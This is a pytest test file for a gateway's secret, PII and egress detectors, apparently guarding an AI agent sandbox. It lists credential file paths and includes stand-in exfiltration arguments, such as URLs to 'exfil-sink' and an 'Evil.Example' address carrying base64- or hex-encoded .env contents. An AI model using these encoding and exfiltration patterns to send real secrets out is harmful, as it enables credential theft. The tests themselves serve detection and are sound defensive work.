import pytest

from gateway.detectors import (
    REDACTED,
    egress_targets,
    iter_strings,
    paths_in_args,
    redact_secrets,
    secret_content_labels,
    secret_path_labels,
)
from tools_servers.sandbox import SEED_DIR


@pytest.mark.parametrize(
    ("path", "label"),
    [
        (".env", "path:dotenv"),
        ("projects/app/.env.production", "path:dotenv"),
        (".ssh/id_rsa", "path:ssh_dir"),
        ("keys/id_ed25519", "path:private_key_file"),
        ("certs/server.pem", "path:key_material"),
        ("config\\credentials.json", "path:credentials_file"),
    ],
)
def test_secret_paths(path: str, label: str) -> None:
    assert label in secret_path_labels(path)


@pytest.mark.parametrize(
    "path",
    ["docs/readme.md", "projects/app/config.yaml", "docs/environment.md", "data/customers.csv"],
)
def test_benign_paths(path: str) -> None:
    assert secret_path_labels(path) == set()


def test_seed_secrets_are_detected_by_content() -> None:
    env = (SEED_DIR / ".env").read_text(encoding="utf-8")
    key = (SEED_DIR / ".ssh" / "id_rsa").read_text(encoding="utf-8")
    assert {"content:openai_style_key", "content:secret_assignment"} <= secret_content_labels(env)
    assert "content:private_key" in secret_content_labels(key)


def test_benign_content_has_no_labels() -> None:
    text = (SEED_DIR / "docs" / "readme.md").read_text(encoding="utf-8")
    assert secret_content_labels(text) == set()


def test_redaction_removes_values_but_keeps_names() -> None:
    env = (SEED_DIR / ".env").read_text(encoding="utf-8")
    red = redact_secrets(env)
    assert "sk-fake-0000" not in red
    assert "fake-db-password-not-real" not in red
    assert "DATABASE_PASSWORD=" + REDACTED in red
    header = "-----BEGIN " + "OPENSSH PRIVATE KEY-----"  # split: keep pre-commit hook strict
    assert "-----BEGIN" not in redact_secrets(f"x {header} y")


def test_egress_targets_from_nested_args() -> None:
    args = {
        "url": "http://exfil-sink:8000/collect?d=1",
        "to": "a@acme.example, drop@Evil.Example",
        "nested": {"links": ["see https://mockweb/docs", "plain text"]},
    }
    assert egress_targets(args) == {
        "http:exfil-sink",
        "http:mockweb",
        "email:acme.example",
        "email:evil.example",
    }


def test_paths_and_iter_strings() -> None:
    args = {"path": ".env", "content": "x", "File": "a.txt", "n": 3}
    assert sorted(paths_in_args(args)) == [".env", "a.txt"]
    assert sorted(iter_strings({"a": ["x", {"b": "y"}], "c": 1})) == ["x", "y"]


def test_pii_labels_thresholds() -> None:
    from gateway.detectors import pii_labels

    csv = (SEED_DIR / "data" / "customers.csv").read_text(encoding="utf-8")
    assert pii_labels(csv) == {"pii:emails"}
    assert pii_labels("contact platform@acme.example") == set()  # single address is not a dump
    assert "pii:phones" in pii_labels("Call +91 98765 43210 or +91 91234 56789")


def test_fingerprints_survive_encoding_and_ignore_plain_words() -> None:
    import base64
    from urllib.parse import quote

    from gateway.detectors import fingerprints

    key = "sk-fake-0000000000000000000000000000SANDBOX"
    base = fingerprints(f"FAKE_API_KEY={key}")
    assert base & fingerprints(f"http://x/?d={quote('FAKE_API_KEY=' + key)}")
    assert base & fingerprints(base64.b64encode(f"FAKE_API_KEY={key}".encode()).decode())
    assert not fingerprints("please summarise the handbook") & base
    # Harmless lines of a secret file are not stored as taint (store side).
    env = (SEED_DIR / ".env").read_text(encoding="utf-8")
    comment = next(line for line in env.splitlines() if line.startswith("#"))
    assert not fingerprints(comment) & fingerprints(env, sensitive_lines_only=True)


# --- encoded-leak regressions ------------------------------------------------------------------


def _env_and_taint() -> tuple[str, set[str]]:
    from data.sandbox_values import SessionValues
    from gateway.detectors import fingerprints

    env = SessionValues.generate("detector-regression").dotenv()
    return env, fingerprints(env, sensitive_lines_only=True)


def test_base64_single_line_and_whole_file_both_caught() -> None:
    import base64

    from gateway.detectors import fingerprints_in_args

    env, taint = _env_and_taint()
    line = next(x for x in env.splitlines() if x.startswith("FAKE_API_KEY"))
    one = base64.b64encode(line.encode()).decode()
    whole = base64.b64encode(env.encode()).decode()
    assert taint & fingerprints_in_args({"body": one})
    assert taint & fingerprints_in_args({"body": f"backup follows:\n{whole}\nthanks"})


def test_hex_and_nested_encodings_caught() -> None:
    import base64
    from urllib.parse import quote

    from gateway.detectors import fingerprints_in_args

    env, taint = _env_and_taint()
    hexed = env.encode().hex()
    b64_of_hex = base64.b64encode(hexed.encode()).decode()
    url_b64 = "http://exfil-sink:8000/c?d=" + quote(base64.b64encode(env.encode()).decode())
    assert taint & fingerprints_in_args({"body": hexed})
    assert taint & fingerprints_in_args({"body": b64_of_hex})  # layer 2: hex inside base64
    assert taint & fingerprints_in_args({"url": url_b64})  # base64 inside URL-encoding


def test_decoding_is_bounded() -> None:
    import base64

    from gateway.detectors import DECODE_MAX_INPUT, _variants

    env, _ = _env_and_taint()
    triple = base64.b64encode(base64.b64encode(env.encode().hex().encode())).decode()
    assert env not in _variants(triple)  # a third layer is not unwrapped
    huge = base64.b64encode(env.encode()).decode() + "A" * DECODE_MAX_INPUT
    assert _variants(huge) == [huge]


def test_decoding_adds_no_false_matches_on_plain_hex_or_words() -> None:
    from gateway.detectors import fingerprints_in_args

    _, taint = _env_and_taint()
    benign = {"sql": "SELECT 1", "body": "commit 3f9a2b7c4d5e6f708192a3b4c5d6e7f8 deployed",
              "url": "http://mockweb/docs/getting-started?page=2"}  # fmt: skip
    assert not taint & fingerprints_in_args(benign)
